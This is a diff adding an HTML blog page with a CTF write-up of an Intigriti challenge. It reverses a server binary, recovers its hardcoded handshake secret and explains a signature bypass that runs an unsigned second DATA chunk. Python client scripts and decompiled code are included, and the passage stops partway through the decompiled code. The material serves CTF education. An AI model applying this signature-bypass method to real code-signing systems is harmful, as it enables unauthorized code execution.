@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Intigriti | Challenge 1126 Writeup | Yours, Sto ʚɞ</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap">
+
+      <script src="/js/main.js"></script>
+
+
+<meta name="description" content="A super fast writeup for the super fast server x)">
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intigriti | Challenge 1126 Writeup">
+<meta property="og:description" content="A super fast writeup for the super fast server x)">
+<meta property="og:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Intigriti | Challenge 1126 Writeup">
+<meta name="twitter:description" content="A super fast writeup for the super fast server x)">
+<meta name="twitter:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="google-site-verification" content="HZuVMLvcO_JxYvwt6swb5-dfFikUHJW1aVEEvBvEDtI" />
+</head>
+<body>
+  <header>
+    <a href="/"><h3>Yours, Sto ʚɞ</h3></a>
+
+  <nav>
+    <ul>
+    <li>
+      <a href="/">Home</a>
+    </li>
+    <li>
+      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
+    </li>
+    <li>
+      <a href="/tags/">Tags</a>
+    </li>
+    <li>
+      <a href="/whoami/">Whoami</a>
+    </li>
+    </ul>
+  </nav>
+
+</div>
+
+  </header>
+  <main>
+    
+  <h1>Intigriti | Challenge 1126 Writeup</h1>
+
+    
+      <p class="date">Nov 23, 2026</p>
+    
+
+
+    
+    
+  <div class="tags">
+    
+    <ul>
+        <li><a href="/tags/reverse/">#Reverse</a></li>
+    </ul>
+  </div>
+
+    
+    <div class="content">
+      <p>A Super Fast Writeup for the Super Fast Server x) This challenge encompassed both web and reverse with a signature bypass that allowed us to read <code>/the_real.flag</code> from a server that only executes RSA-2048 signed code.</p>
+<h3 id="recon">Recon</h3>
+<p>We land on a login page. Sending anything to <code>/login.html</code> returns a <strong><code>418 I'm a teapot</code></strong>, which is not a normal auth response, that&rsquo;s the server telling us <em>&ldquo;this endpoint is a not really useful&rdquo;</em>.</p>
+<p>The changelog is our real recon target:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>v2.0.1 — Added signups, Added POST request parsing.  
+</span></span><span style="display:flex;"><span>v2.0.0 — Fixed a path traversal, Added a custom protocol, protected by a very good secret to allow execution of RSA-2048 signed code.   
+</span></span><span style="display:flex;"><span>v1.0.0 — Initial public release.
+</span></span></code></pre></div><p>And the docs, most importantly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>The server serves files from the PWD.   
+</span></span><span style="display:flex;"><span>DON&#39;T Run the server binary in the PWD.
+</span></span></code></pre></div><p>In other words, <em>the server binary is in the PWD and is downloadable, go reverse it.</em></p>
+<p>We download the binary which we later reverse using Ghidra.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>└─$ curl https://challenge-1126.challenges.intigriti.io/superfastserver -o superfastserver 
+</span></span><span style="display:flex;"><span>└─$ file superfastserver                                                                      
+</span></span><span style="display:flex;"><span>superfastserver: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>d2c861447de60ff0a8cd9daf9a7e0cf2bf3499e0, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, stripped
+</span></span></code></pre></div><h3 id="reversing">Reversing</h3>
+<p>Well, before getting into Ghidra details, a quick <code>strings</code> command on the binary allows us to read some anti-Ai strings (oki ^^) but also a <code>brainfuck</code> string, an Intigriti fake flag to be used locally (so okay, we note that we will probably be doing tests locally before running the final exploit on the target), and a <em>secret</em> <code>SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033</code> showcased in the screenshot below :
+<img src="image-1.png" alt="alt text"></p>
+<p>Now, Ghidra.<br>
+Three functions matter out of the whole binary.</p>
+<ul>
+<li>
+<p><strong><code>FUN_00107690</code> : HTTP listener on <code>0x1f90 = 8080</code>.</strong> It spawns <code>FUN_00106d90</code> per connection.</p>
+</li>
+<li>
+<p><strong><code>FUN_00106840</code> : custom-protocol listener on <code>0x1389 = 5001</code>.</strong> It calls <code>FUN_00105cb0</code> per connection and the only one that can read the flag.</p>
+</li>
+<li>
+<p><strong><code>FUN_00106d90</code> : the HTTP handler</strong> and the most important function for us which can be summed up as follows (or at least I think so x)):
+<img src="image-3.png" alt="alt text"></p>
+<ul>
+<li>
+<p><code>GET /</code> redirects to <code>/index.html</code></p>
+</li>
+<li>
+<p><code>GET /&lt;file&gt;</code> serves files if they exist and offers a directory traversal thanks to <code>fopen(basename(path))</code></p>
+</li>
+<li>
+<p><code>POST /custom_protocol</code> is a <strong>raw TCP proxy</strong> to <code>127.0.0.1:5001</code>. The body after <code>\r\n\r\n</code> is forwarded verbatim then a single <code>read(0x2000)</code> is pushed back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pcStack_111c0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>sStack_111c8 <span style="color:#f92672">=</span> lStack_10030 <span style="color:#f92672">-</span> (pcStack_111c0 <span style="color:#f92672">-</span> buf);
+</span></span><span style="display:flex;"><span>iStack_111cc <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">connect</span>(iStack_111cc, <span style="color:#ae81ff">127.0.0.1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5001</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">send</span>(iStack_111cc, pcStack_111c0, sStack_111c8, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(iStack_111cc, auStack_131e8, <span style="color:#ae81ff">0x2000</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FUN_00106b40</span>(fd, <span style="color:#e6db74">&#34;200 OK&#34;</span>, <span style="color:#e6db74">&#34;text/html&#34;</span>, auStack_131e8, n, <span style="color:#ae81ff">0</span>);
+</span></span></code></pre></div></li>
+<li>
+<p>Any other <code>POST</code> gives <code>418 I'm a teapot</code>. So indeed, the login page was just a <em>placeholder</em>.</p>
+</li>
+</ul>
+<p>Our remote entrypoint is <code>POST /custom_protocol</code> on 443 and the protocol bytes become the HTTP body.</p>
+</li>
+<li>
+<p><strong><code>FUN_00105cb0</code>: the custom protocol</strong>
+<img src="image-7.png" alt="alt text"></p>
+<ul>
+<li>106-byte handshake with the super secret then <code>'w' + u32(len) + cmd + payload</code> framing</li>
+<li>Commands: <code>CODE</code>, <code>DATA</code>, <code>SIGN</code>, <code>EXEC</code>, <code>HELP</code>, <code>PING</code>, <code>1337</code></li>
+<li><code>CODE</code> mmaps RWX and copies the payload there</li>
+<li><code>DATA</code> records <code>[offset, length]</code> and is overwritten every time we send a <code>DATA</code> chunk</li>
+<li><code>SIGN</code> records <code>[offset, length]</code></li>
+<li><code>EXEC</code> can be rewritten as below :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cmd <span style="color:#f92672">==</span> EXEC) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sig_offset  <span style="color:#f92672">==</span> UNSET) { <span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;NOSIG&#34;</span>);  <span style="color:#66d9ef">break</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (code_offset <span style="color:#f92672">==</span> UNSET) { <span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;NOCODE&#34;</span>); <span style="color:#66d9ef">break</span>; }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (data_offset <span style="color:#f92672">&lt;</span>  code_offset) { <span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;DATA BEFORE CODE&#34;</span>); <span style="color:#66d9ef">break</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// hash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sha256</span>(inbuf <span style="color:#f92672">+</span> code_offset,
+</span></span><span style="display:flex;"><span>            code_length <span style="color:#f92672">+</span> data_length,
+</span></span><span style="display:flex;"><span>            computed_hash);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// RSA-2048 verify
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">hex_decode</span>(modulus_hex, modulus, <span style="color:#ae81ff">0x100</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rsa_verify</span>(<span style="color:#f92672">&amp;</span>exp_65537, modulus, <span style="color:#ae81ff">0x800</span>,
+</span></span><span style="display:flex;"><span>            inbuf <span style="color:#f92672">+</span> sig_offset, <span style="color:#75715e">// ← SIGN chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            recovered_digest);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// compare + execute
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (rsa_out_len <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">memcmp</span>(recovered_digest, computed_hash, <span style="color:#ae81ff">32</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">code_page</span>(inbuf <span style="color:#f92672">+</span> data_offset, <span style="color:#75715e">// ← LAST DATA   (executed)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                fs_base <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x160</span>, 
+</span></span><span style="display:flex;"><span>                exit_callback);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;BADSIG&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+</ul>
+<p>Here, we observe two issues :</p>
+<ul>
+<li>First, as DATA overwrites the chunk with each <code>DATA</code> received, this entails that if we send :
+<ol>
+<li><code>CODE</code>: <code>code_offset</code> = 0, <code>code_length</code> = C</li>
+<li><code>DATA</code>: <code>data_offset</code> = C, <code>data_length</code> = D</li>
+<li><code>DATA</code>: <code>data_offset</code> = C + D, <code>data_length</code> = D ← overwritten<br>
+If we leave it here, it can be fine but the real issue is the following.</li>
+</ol>
+</li>
+<li>In <code>EXEC</code> (to use it we need to send <code>CODE</code>, then <code>DATA</code>, then <code>SIGN</code>, then <code>EXEC</code>):
+<ul>
+<li>On one side, <code>HASH</code> starts at start of <code>CODE</code> (<code>inbuf + code_offset</code>) and covers <code>CODE || len(last_DATA)</code> bytes, in other words, <code>code_length + data_length</code>.</li>
+<li>On the flip side, the execution pointer of <code>EXEC</code> starts at the start of last <code>DATA</code> (<code>inbuf + data_offset</code>).</li>
+</ul>
+</li>
+</ul>
+<p>Combining these two elements, and as the data_length is not updated when several <code>DATA</code> chunks are received, if we send <code>CODE</code>, then <code>DATA1</code> (signed), then <code>DATA2</code> of the same length, the hash still verifies <code>CODE || DATA1</code> but the shellcode runs <code>DATA2</code>. That will allow us to execute our code on the server.</p>
+<p><img src="image-5.png" alt="alt text"></p>
+<p>Nevertheless, to achieve that, we first need a signed code as we do not have the private key.</p>
+<p>Let&rsquo;s try to interact with the binary to see what the command <code>HELP</code> yields.</p>
+<h3 id="local-setup">Local setup</h3>
+<p>We run the binary locally :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;INTIGRITI{THIS_IS_A_FAKE_FLAG_USE_IT_TO_SOLVE_LOCALLY_THEN_REPLAY_TO_THE_SERVER}&#34;</span> &gt; the_real.flag
+</span></span><span style="display:flex;"><span>└─$ ./superfastserver
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>140435406268096<span style="color:#f92672">]</span> HTTP server listening on port <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>140435397875392<span style="color:#f92672">]</span> custom protocol server listening on port <span style="color:#ae81ff">5001</span>
+</span></span></code></pre></div><p>And we use the following script to send the command <code>HELP</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST, PORT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>HANDSHAKE <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd</span>(name, data<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w&#34;</span> <span style="color:#f92672">+</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, len(data)) <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## send HELP </span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> HANDSHAKE <span style="color:#f92672">+</span> cmd(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;HELP&#34;</span>)
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>create_connection((HOST, PORT))
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendall(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;POST /custom_protocol HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: </span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Content-Length: </span><span style="color:#e6db74">{</span>len(payload)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> payload
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>body <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(iter(<span style="color:#66d9ef">lambda</span>: s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">65536</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>))<span style="color:#f92672">.</span>partition(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(body)
+</span></span></code></pre></div><p>This yields this output which is not really readable x)
+<img src="image-8.png" alt="alt text"></p>
+<p>Hence, we add some parsing to correctly understand what we have by including the following code to our original script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># We #first check our handshake worked</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> body<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ACK</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>), body[:<span style="color:#ae81ff">16</span>]
+</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">=</span> body[<span style="color:#ae81ff">4</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;ACK, blob = </span><span style="color:#e6db74">{</span>len(blob)<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## parsing chunks: &#39;w&#39; + u32(payload+4) + cmd + payload </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># n.b : &#39;w&#39; (1B) + L (4B, u32) + name (4B) + payload (L# - 4B)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">&lt;=</span> len(blob) <span style="color:#f92672">and</span> blob[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w&#34;</span>:
+</span></span><span style="display:flex;"><span>    L <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, blob[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>])[<span style="color:#ae81ff">0</span>]        
+</span></span><span style="display:flex;"><span>    name, data <span style="color:#f92672">=</span> blob[i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>], blob[i<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">+</span>L]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> name <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;DATA&#34;</span>:                                
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>name<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">:</span><span style="color:#e6db74">5s</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">{</span>len(data)<span style="color:#e6db74">}</span><span style="color:#e6db74">)  </span><span style="color:#e6db74">{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:                                              
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>name<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">:</span><span style="color:#e6db74">5s</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">{</span>len(data)<span style="color:#e6db74">}</span><span style="color:#e6db74">)  </span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> L
+</span></span></code></pre></div><p>Running our edited code yields the following :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ACK, blob = 1112 bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CODE  (396)  554889e54883ec4048897df8488975f0488955e848894de0488b45f0488945d848c745c800000000488b45f8488b4dc80fbe040883f8000f8449010000488b45f8488b4dc88a04088845d70fbe45d783f83e7511488b45d84883c001488945d8e90e0100000fbe45d783f83c7511488b45d84883c0ff488945d8e9f20000000fbe45d783f82b7510488b45d88a0880c1018808e9d70000000fbe45d783f82d7510488b45d88a0880c1ff8808e9bc0000000fbe45d783f82e7512488b45e8488b4dd80fbe39ffd0e99f0000000fbe45d783f82c7512b000ff55e088c1488b45d88808e9820000000fbe45d783f85b7505e9800000000fbe45d783f85d7567488b45d80fb60083f800745b48c745c00100000048837dc000764a488b45f8488b4dc84889ca4883c2ff488955c88a4408ff8845d70fbe45d783f85b750e488b45c04883c0ff488945c0eb170fbe45d783f85d750c488b45c04883c001488945c0eb00ebafeb00eb00eb00eb00eb00eb00eb00eb00eb00488b45c84883c001488945c8e9a2feffff4883c4405dc3
+</span></span><span style="display:flex;"><span>DATA  (424)  b&#39;-[-------&gt;+&lt;]&gt;.-[-&gt;++++&lt;]&gt;.-[---&gt;++&lt;]&gt;--.+++++++.+.-----------.--[---&gt;+&lt;]&gt;-.--[-&gt;++++&lt;]&gt;+.----------.++++++.-[----&gt;+&lt;]&gt;+++.++[---&gt;++&lt;]&gt;.---.++.------.--[---&gt;+&lt;]&gt;-.---[-&gt;++++&lt;]&gt;.------------.+.++++++++++.+[----&gt;+&lt;]&gt;+++.---[-&gt;++++&lt;]&gt;-.----.[---&gt;+&lt;]&gt;-----.++[-&gt;+++&lt;]&gt;.-----.--[---&gt;+&lt;]&gt;---.++[++&gt;---&lt;]&gt;.++[---&gt;++&lt;]&gt;.--[--&gt;+++++&lt;]&gt;.[---&gt;++++&lt;]&gt;+..+++++++++++.[-------&gt;++&lt;]&gt;.++[-&gt;+++&lt;]&gt;+.++++++++.------.+++++.-------.-[---&gt;+&lt;]&gt;-.&#39;
+</span></span><span style="display:flex;"><span>SIGN  (256)  66fa7f4d3eac26376ff07602cd2f93b4450fec250138a1206e2a2a6273fa472fdedd9170957559fc628d27feb6420100a962bf1f6ff1a5c355fc457379752e4611bd1f941832370aad9048049b0e7bd25328856704d7e56a0dfbc44c1ff02d64c8f35e128852e77533a54347e3ba93fe3fbd256e702a987dec6093709daa0b82b9126d6a9b0c8940736ea65722efa28212501061ef441037d11789e4a7813b003bc4164e340ae84356c53ea94a6768996451956a99294a518fe1f90d725b907f70a5bc9dca56659d87bdadfc06e31978e0cdd3594f7e48ab83e64b78d59ad24245bacdbdc0f8d610115d9f2c786d8384d5e2efd74d72c279ed02af61ddf48ac0
+</span></span><span style="display:flex;"><span>EXEC  (0) 
+</span></span></code></pre></div><p>We observe that the <code>HELP</code> command returns a complete signed blob with a valid <code>CODE + DATA + SIGN</code> triplet (which is exactly what we needed).</p>
+<p>Also, we observe that brainfuck string in the received data which we decode via <a href="https://brainfuck.net/">brainfuck.net</a> to obtain the following :</p>
+<p><img src="image.png" alt="alt text"></p>
+<p>Honest answer : So far, yes ^^ but most importantly, this should mean that the interpreter is a Brainfuck VM x)</p>
+<p>At this point, we basically have all the elements to construct our exploit which would be as follows:</p>
+<ul>
+<li>We extract the valid signed blob of <code>CODE + DATA</code> from the <code>HELP</code> command demo output</li>
+<li>We write our payload in brainfuck</li>
+<li>We build our payload with :
+<ul>
+<li><code>CODE</code>: server mmaps it and sets <code>code_offset</code> = 0</li>
+<li>1st <code>DATA</code> which is the signed one, i.e. the hash target,</li>
+<li>2nd <code>DATA</code> which is our Brainfuck (same length as 1st DATA) and will be executed</li>
+<li><code>SIGN</code> that is the pre-signed signature from <code>HELP</code></li>
+<li><code>EXEC</code></li>
+</ul>
+</li>
+</ul>
+<p>One last detail : constructing our payload.
+Our flag sits in <code>fs_base-0x60</code> (part which we did not yet ention about <code>FUN_00105cb0</code> but showcased in the following). Indeed,  given that <code>in_FS_OFFSET</code> is the <code>fs_base</code> below, <code>FUN_00105cb0</code> first reads the flag into the buffer <code>local_78</code> then copies its content to <code>fs_base - 0x60</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>local_20 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/the_real.flag&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (local_20 <span style="color:#f92672">!=</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>local_78,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x51</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span>local_78,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x51</span>,local_20);       <span style="color:#75715e">// read flag into buffer local_78
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fclose</span>(local_20);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// copy 81 bytes to fs_base - 0x60&#34; (one slot at a time)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(undefined1 <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">=</span> local_28;   <span style="color:#75715e">// fs_base - 0x10 : flag[80]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> local_38;                     <span style="color:#75715e">// fs_base - 0x20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> lStack_30;                    <span style="color:#75715e">// fs_base - 0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> local_48;                     <span style="color:#75715e">// fs_base - 0x30
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> lStack_40;                    <span style="color:#75715e">// fs_base - 0x28
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> local_58;                     <span style="color:#75715e">// fs_base - 0x40
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> lStack_50;                    <span style="color:#75715e">// fs_base - 0x38
